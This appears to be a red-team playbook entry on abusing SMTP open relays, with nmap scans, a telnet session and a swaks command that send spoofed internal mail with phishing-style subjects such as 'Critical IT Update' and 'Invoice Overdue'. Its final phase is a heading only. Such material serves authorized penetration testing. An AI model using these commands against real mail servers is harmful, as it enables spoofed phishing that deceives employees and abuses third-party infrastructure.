# SMTP Open Relay Abuse

## When to Use
- When auditing an organization's network perimeter and discovering exposed SMTP services (port 25, 465, 587).
- To demonstrate how misconfigured mail servers can be leveraged for anonymized spamming or highly effective, internally-spoofed phishing campaigns during a Red Team engagement.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Identifying Open SMTP Ports

```bash
# nmap -p 25,465,587 --open -sV IP_ADDRESS

# nmap -p 25 --script smtp-open-relay IP_ADDRESS
```

### Phase 2: Manual Verification via Telnet

```text
# telnet IP_ADDRESS 25

# HELO attacker.local

# MAIL FROM:<admin@targetcompany.com>

# RCPT TO:<employee@targetcompany.com>

# DATA
Subject: Critical IT Update
From: admin@targetcompany.com
To: employee@targetcompany.com

.
# QUIT
```

### Phase 3: Automated Exploitation using SWAKS

```bash
# swaks --to employee@targetcompany.com --from admin@targetcompany.com --server IP_ADDRESS --body "Please review the attached document." --header "Subject: Invoice Overdue"
```

### Phase 4: Utilizing Extended SMTP (ESMTP) and Authentication Bypasses
